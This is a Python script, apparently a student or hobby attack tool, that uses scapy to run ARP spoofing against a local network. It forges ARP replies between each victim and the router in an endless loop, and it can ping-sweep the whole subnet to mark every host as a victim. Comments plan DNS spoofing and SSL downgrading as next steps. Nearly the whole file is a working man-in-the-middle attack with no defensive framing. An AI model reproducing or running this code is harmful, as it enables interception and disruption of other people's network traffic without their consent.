
#!/usr/bin/env python
import time
import sys
import scapy.all as scapy
import os

iface = None
arp_looping = True

# MAC address function which will return
# the mac_address of the provided ip address 
def get_mac(ip):
    # creating an ARP request to the ip address
    arp_request = scapy.ARP(pdst=ip)
    # setting the denstination MAC address to broadcast MAC
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combining the ARP packet with the broadcast message
    arp_request_broadcast = broadcast / arp_request
     
    # return a list of MAC addresses with respective
    # MAC addresses and IP addresses.
    answ = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, iface=iface)[0]
    if answ:
        # we choose the first MAC address and select
        # the MAC address using the field hwsrc
        return answ[0][1].hwsrc
    else:
        raise Exception("No arp response for {}".format(ip))

 
  
def arp_spoof(target_ip, spoof_ip):
    """" Here the ARP packet is set to response and
    pdst is set to the target IP 
    either it is for victim or router and the hwdst
    is the MAC address of the IP provided
    and the psrc is the spoofing ip address
    to manipulate the packet"""
     
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)
 

def arp_main(silent, manual, router, input_iface):
    # TOADD: 
    # - arguments: silent/allin, autoscan/manualinput, dns things, input for all addresses
    # - threads
    # - ssl downgrading
    # victim_ip = input()  # taking the victim ip_address
    # router_ip = input()  # taking the router ip address
    victim_addresses = manual
    router_ip = router
    global iface 
    iface = input_iface
    sent_packets_count = 0  # initializing the packet counter

    while arp_looping:
        for victim_ip in victim_addresses:
            sent_packets_count += 2
            arp_spoof(victim_ip, router_ip)
            arp_spoof(router_ip, victim_ip)
            sys.stdout.write("[+] Packets sent " + str(sent_packets_count) + "\r")
            sys.stdout.flush()
            time.sleep(2)






#Methods used for dns spoofing, automated was intended to be used for arp spoofing, but threading hurts as cli doesnt allow quitting with threading
victim_addresses = []
router_ip = None
iface = None
sent_packets_count = 0 

def arp_main_automated(silent = False, iface_ = "enp0s10") :
    global victim_addresses, router_ip, iface, sent_packets_count

    current_ip = scapy.get_if_addr(iface)
    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
    router_ip = current_ip.rsplit('.', 1)[0] + '.1' #usually router is at subnet .1
    
    victims = []

    for i in range(2,255) :  #all other ips in subnet
        ip = subnet + "." + str(i)
        
        rsp = scapy.sr1(scapy.IP(dst=ip)/scapy.ICMP(), timeout=1, verbose=0)
        if rsp is not None:
            victims.append(ip)

    victims.remove(current_ip)
    
    victim_addresses = victims
    iface = iface_
    print("Victims: ", str(victims))

    #arp_main(silent, victims, router_ip, iface)

def arp_tick():
    for victim_ip in victim_addresses:
            sent_packets_count += 2
            arp_spoof(victim_ip, router_ip)
            arp_spoof(router_ip, victim_ip)
            sys.stdout.write("[+] Packets sent " + str(sent_packets_count) + "\r")
            sys.stdout.flush()
            time.sleep(2)

